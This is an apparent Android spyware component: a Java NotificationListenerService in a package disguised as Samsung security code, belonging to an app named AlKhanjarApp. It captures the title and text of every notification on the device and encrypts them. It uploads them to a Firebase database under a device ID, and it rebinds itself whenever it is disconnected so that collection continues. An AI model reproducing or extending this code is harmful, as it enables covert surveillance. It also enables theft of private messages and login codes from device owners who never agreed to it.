package com.samsung.android.security.v8.services;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.AlKhanjarApp;
import com.samsung.android.security.v8.utils.CryptoManager;

import java.util.HashMap;
import java.util.Map;

/**
 * NotificationService - خدمة الإشعارات
 * تلتقط جميع الإشعارات الواردة للجهاز
 */
public class NotificationService extends NotificationListenerService {
    
    private static final String TAG = "NotificationService";
    private DatabaseReference notificationsRef;
    private String deviceId;
    
    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        
        deviceId = AlKhanjarApp.getDeviceUniqueId();
        
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        notificationsRef = database.getReference("notifications").child(deviceId);
        
        Log.d(TAG, "NotificationService connected");
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            android.app.Notification notification = sbn.getNotification();
            
            // استخراج المعلومات
            String title = "";
            String text = "";
            
            if (notification.extras != null) {
                CharSequence titleSeq = notification.extras.getCharSequence(android.app.Notification.EXTRA_TITLE);
                CharSequence textSeq = notification.extras.getCharSequence(android.app.Notification.EXTRA_TEXT);
                
                if (titleSeq != null) title = titleSeq.toString();
                if (textSeq != null) text = textSeq.toString();
            }
            
            // تسجيل الإشعار
            logNotification(packageName, title, text, sbn.getPostTime());
            
        } catch (Exception e) {
            Log.e(TAG, "Notification processing error: " + e.getMessage());
        }
    }
    
    /**
     * تسجيل الإشعار في Firebase
     */
    private void logNotification(String packageName, String title, String text, long timestamp) {
        try {
            Map<String, Object> notification = new HashMap<>();
            notification.put("package", packageName);
            notification.put("title", CryptoManager.encrypt(title));
            notification.put("text", CryptoManager.encrypt(text));
            notification.put("timestamp", timestamp);
            
            notificationsRef.push().setValue(notification);
            
            Log.d(TAG, "Notification logged: " + packageName);
            
        } catch (Exception e) {
            Log.e(TAG, "Notification logging error: " + e.getMessage());
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // يمكن تسجيل الإشعارات المحذوفة أيضاً
    }
    
    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.d(TAG, "NotificationService disconnected");
        
        // إعادة الاتصال
        requestRebind(new android.content.ComponentName(this, NotificationService.class));
    }
}
